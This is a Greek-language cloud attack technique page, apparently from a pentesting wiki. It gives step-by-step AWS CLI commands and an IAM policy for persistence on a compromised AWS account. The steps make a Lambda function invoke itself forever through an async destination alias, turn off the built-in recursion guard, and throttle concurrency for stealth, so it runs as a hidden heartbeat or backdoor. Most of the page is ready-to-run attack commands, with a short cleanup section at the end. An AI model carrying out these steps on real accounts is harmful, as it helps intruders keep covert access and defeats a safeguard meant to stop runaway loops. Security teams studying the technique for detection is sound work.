# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

Καταχράσου τα asynchronous Destinations του Lambda μαζί με τη ρύθμιση Recursion για να κάνεις μια function να καλεί συνεχώς τον εαυτό της χωρίς εξωτερικό scheduler (χωρίς EventBridge, cron, κ.λπ.). Από προεπιλογή, το Lambda τερματίζει τους αναδρομικούς βρόχους, αλλά η ρύθμιση recursion σε Allow τους επανενεργοποιεί. Τα Destinations παραδίδουν στην πλευρά της υπηρεσίας για async invokes, οπότε μια μοναδική seed invoke δημιουργεί ένα stealthy, χωρίς κώδικα κανάλι heartbeat/backdoor. Προαιρετικά, περιορίστε με reserved concurrency για να κρατήσετε τον θόρυβο χαμηλό.

Notes
- Το Lambda δεν επιτρέπει την άμεση ρύθμιση της function ώστε να είναι ο ίδιος ο προορισμός της. Χρησιμοποιήστε ένα function alias ως προορισμό και επιτρέψτε στο execution role να κάνει invoke αυτό το alias.
- Ελάχιστα δικαιώματα: δυνατότητα ανάγνωσης/ενημέρωσης του target function’s event invoke config και recursion config, δημοσίευσης ενός version και διαχείρισης ενός alias, και ενημέρωσης της policy του function’s execution role ώστε να επιτρέπεται το lambda:InvokeFunction στο alias.

## Απαιτήσεις
- Region: us-east-1
- Vars:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## Βήματα

1) Πάρε το function ARN και την τρέχουσα ρύθμιση recursion
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) Δημοσιεύστε μια έκδοση και δημιουργήστε/ενημερώστε ένα alias (χρησιμοποιείται ως self destination)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) Επιτρέψτε στο ρόλο εκτέλεσης της συνάρτησης να καλεί το alias (απαιτείται από Lambda Destinations→Lambda)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) Ρυθμίστε το async destination στο alias (self via alias) και απενεργοποιήστε τα retries
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) Επιτρέψτε αναδρομικούς βρόχους
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) Δημιούργησε ένα μεμονωμένο ασύγχρονο invoke
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) Παρατηρήστε συνεχείς κλήσεις (παραδείγματα)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) Προαιρετικό stealth throttle
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## Καθαρισμός
Διακόψτε το loop και αφαιρέστε την persistence.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## Impact
- Ένα async invoke προκαλεί τη Lambda να αυτο-επανεκκινείται συνεχώς χωρίς εξωτερικό scheduler, επιτρέποντας stealthy persistence/heartbeat. Reserved concurrency μπορεί να περιορίσει τον θόρυβο σε μία warm execution.
